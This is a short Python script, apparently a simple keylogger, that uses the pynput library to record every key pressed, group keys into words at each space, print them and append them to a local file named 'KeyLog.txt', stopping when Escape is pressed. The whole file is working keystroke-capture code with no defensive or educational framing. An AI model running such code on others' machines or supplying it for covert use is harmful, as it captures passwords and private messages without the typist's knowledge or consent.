from pynput.keyboard import Listener as L, Key as K

kl_name = "KeyLog.txt"

output = []

def pressing(output_key):
    if output_key != K.space:
        output.append(output_key)
    else:
        print(output)
        with open(kl_name, "a") as f:
            for inp_letter in output:
                inp_letter = str(inp_letter).strip("'")
                f.write(str(inp_letter))
            f.write(" ")
        output.clear()

def releasing(key):
    if key == K.esc:
        return False

with L(on_press = pressing, on_release = releasing) as l:
    l.join()